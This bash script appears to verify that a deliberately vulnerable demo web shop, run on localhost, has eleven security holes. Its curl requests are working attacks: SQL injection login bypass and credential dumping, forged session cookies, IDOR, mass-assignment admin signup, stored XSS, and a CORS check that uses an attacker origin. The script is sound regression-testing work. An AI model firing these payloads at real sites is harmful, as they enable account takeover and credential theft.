#!/usr/bin/env bash
# verify_v0.sh — reproducible evidence that the v0 baseline is vulnerable.
# Each check PASSES when the vulnerability is PRESENT (that is the point of v0).
# For v1/v2 these same checks should flip to FAIL (i.e. mitigated) — use this
# script for regression testing. Backend must be running on :8080.
#
#   cd backend && cargo run        # terminal 1
#   ./scripts/verify_v0.sh         # terminal 2
#
# Localhost + synthetic data only.
set -u
B="${BASE:-http://localhost:8080}"
pass=0; fail=0
ok()   { echo "  [VULNERABLE] $1"; pass=$((pass+1)); }
no()   { echo "  [mitigated?] $1"; fail=$((fail+1)); }
hr()   { echo "------------------------------------------------------------"; }

echo "SlopShop v0 vulnerability verification against $B"
hr

# VULN-01 SQL injection — authentication bypass
echo "VULN-01  SQLi authentication bypass (login)"
body="{\"username\":\"' OR '1'='1' -- \",\"password\":\"nope\"}"
r=$(curl -s -X POST "$B/api/login" -H 'Content-Type: application/json' -d "$body")
echo "$r" | grep -q '"role":"admin"' && ok "logged in as admin without credentials" || no "bypass blocked"
hr

# VULN-01 SQL injection — UNION data exfiltration via search
echo "VULN-01  SQLi UNION credential dump (search)"
r=$(curl -s --get "$B/api/search" --data-urlencode "q=%' UNION SELECT id,username,password,0 FROM users -- ")
echo "$r" | grep -q 'admin123' && ok "dumped password hashes/plaintext via UNION" || no "union injection blocked"
hr

# VULN-02 / VULN-09  Plaintext password storage + disclosure
echo "VULN-02  Plaintext password storage & disclosure"
r=$(curl -s "$B/api/users/1")
echo "$r" | grep -q '"password":"admin123"' && ok "plaintext password returned by API" || no "password not exposed"
hr

# VULN-03  Forgeable session (session = user id)
echo "VULN-03  Forgeable session cookie"
r=$(curl -s -b "session=1" "$B/api/me")
echo "$r" | grep -q '"role":"admin"' && ok "forged session=1 authenticated as admin" || no "session forgery blocked"
hr

# VULN-04  IDOR on orders
echo "VULN-04  IDOR — read arbitrary order"
curl -s -X POST "$B/api/orders" -H 'Content-Type: application/json' -d '{"items":"[]","total":1}' >/dev/null
r=$(curl -s "$B/api/orders/1")
echo "$r" | grep -q '"id":1' && ok "arbitrary order readable with no ownership check" || no "IDOR blocked"
hr

# VULN-05  Broken/missing function-level access control
echo "VULN-05  Broken access control — customer hits admin API"
curl -s -c /tmp/ss_v.txt -X POST "$B/api/signup" -H 'Content-Type: application/json' \
     -d '{"username":"verify_cust_'"$RANDOM"'","password":"x","role":"customer"}' >/dev/null
r=$(curl -s -b /tmp/ss_v.txt "$B/api/admin/users")
echo "$r" | grep -q 'admin123' && ok "non-admin listed all users + passwords" || no "admin API protected"
hr

# VULN-06  Mass assignment — self-register as admin
echo "VULN-06  Mass assignment — privilege escalation at signup"
r=$(curl -s -X POST "$B/api/signup" -H 'Content-Type: application/json' \
     -d '{"username":"verify_admin_'"$RANDOM"'","password":"x","role":"admin"}')
echo "$r" | grep -q '"role":"admin"' && ok "registered a new admin account" || no "role assignment rejected"
hr

# VULN-07 / VULN-08  XSS sink precondition (payload stored & returned unescaped)
echo "VULN-07  Stored-XSS sink (API returns raw HTML)"
r=$(curl -s "$B/api/products")
echo "$r" | grep -q '<b>' && ok "product HTML returned unescaped (renders via innerHTML)" || no "output appears encoded"
echo "         (full JS execution confirmed in browser: document.title => XSS_FIRED / RXSS_FIRED)"
hr

# VULN-09  Verbose error / information disclosure
echo "VULN-09  Verbose SQL error disclosure"
r=$(curl -s "$B/api/products/abc")
echo "$r" | grep -q 'no such column' && ok "raw SQL error + query echoed to client" || no "errors are generic"
hr

# VULN-10  Permissive credentialed CORS
echo "VULN-10  CORS reflects any origin with credentials"
r=$(curl -s -i -H "Origin: https://evil.example" "$B/api/products")
echo "$r" | grep -qi 'access-control-allow-origin: https://evil.example' && \
  echo "$r" | grep -qi 'access-control-allow-credentials: true' && \
  ok "attacker origin reflected with credentials allowed" || no "CORS restricted"
hr

# VULN-11  No rate limiting / lockout
echo "VULN-11  No login rate limiting"
for i in $(seq 1 20); do curl -s -o /dev/null -X POST "$B/api/login" \
  -H 'Content-Type: application/json' -d '{"username":"admin","password":"wrong"}'; done
r=$(curl -s -X POST "$B/api/login" -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin123"}')
echo "$r" | grep -q '"role":"admin"' && ok "no lockout after 20 failed attempts" || no "account locked out"
hr

echo
echo "SUMMARY: $pass vulnerabilities present, $fail checks did not reproduce."
echo "(VULN-12 CSRF + non-HttpOnly cookie: demonstrated in docs/VULNERABILITIES.md)"
